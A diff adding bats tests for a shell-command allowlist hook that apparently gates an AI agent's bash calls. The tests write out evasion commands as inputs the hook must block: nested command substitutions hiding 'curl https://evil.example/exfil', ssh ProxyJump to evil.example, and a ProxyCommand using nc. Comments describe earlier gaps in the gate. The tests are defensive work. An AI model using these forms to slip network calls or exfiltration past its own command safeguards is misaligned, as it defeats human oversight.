@@ -704,6 +704,60 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "block"'
 }
 
+@test "AC-2 (Codex CR4-A): NESTED \$(echo \$(curl evil)) recurses + blocks inner curl" {
+  # Without recursive substitution inspection, the outer body was
+  # `echo $(curl ...)` → classified on `echo` → ALLOW, inner curl bypass.
+  # Recursive walker now descends until no more substitutions remain.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'echo "$(echo $(curl https://evil.example/exfil))"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR4-A): deeply nested \$(a \$(b \$(curl evil))) still blocks" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'true; echo $(echo $(echo $(curl https://evil.example/x)))'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex CR4-B): 'ssh -o ProxyJump=evil allowed' validates jumphost" {
+  # Previously -o ProxyJump=evil was eaten as a generic -o pair without
+  # inspecting the value, so jumphost reached without allowlist check.
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -o ProxyJump=evil.example allowed.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
+}
+
+@test "AC-2 (Codex CR4-B): 'ssh -o ProxyJump=allowed allowed' allows when both allowlisted" {
+  printf '%s\n' 'allowed.example' 'jumphost.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -o ProxyJump=jumphost.example allowed.example uptime'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex CR4-B): 'ssh -o ProxyCommand=<anything> allowed' fail-CLOSED blocks" {
+  # ProxyCommand runs an arbitrary shell command — we can't sub-parse
+  # it from inside the hook, so fail CLOSED rather than allow.
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -o ProxyCommand="nc -X 5 127.0.0.1 8080 %h %p" allowed.example'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'ProxyCommand'
+}
+
+@test "AC-2 (Codex CR4-B): ProxyJump option name is case-insensitive (proxyjump=...)" {
+  # ssh's -o option names are case-insensitive. We lowercase before
+  # matching so both `ProxyJump=` and `proxyjump=` are caught.
+  echo 'allowed.example' > "$ALLOWLIST"
+  run _call_hook_bash 'ssh -o proxyjump=evil.example allowed.example'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
 @test "AC-2 (Codex CR3): \$(curl evil) INSIDE SINGLE quotes is NOT a bypass (literal)" {
   # Single quotes are literal in bash — `echo '$(curl evil)'` prints
   # the string verbatim, no expansion. So the gate should ALLOW (the
